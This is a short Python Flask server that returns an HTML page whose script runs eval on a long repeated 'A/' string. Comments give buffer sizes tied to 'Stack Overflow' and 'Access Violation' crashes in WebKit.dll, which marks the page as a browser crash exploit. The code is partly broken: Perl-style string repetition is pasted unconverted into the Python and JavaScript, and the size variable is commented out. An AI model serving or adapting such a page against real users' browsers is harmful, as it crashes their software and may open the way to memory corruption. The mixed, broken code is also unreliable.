
from flask import Flask, request

from pathlib import Path

app = Flask(__name__)


# _size = 21526; # "Stack Overflow" WebKit.dll
# _size = 21697; # "Access Violation" WebKit.dll

TXT = """
<html>
<script type="text/javascript">
eval("' . "A/" x $size . '");
</script>
</html>;
"""

@app.route('/')
def bad_eval():
    return TXT
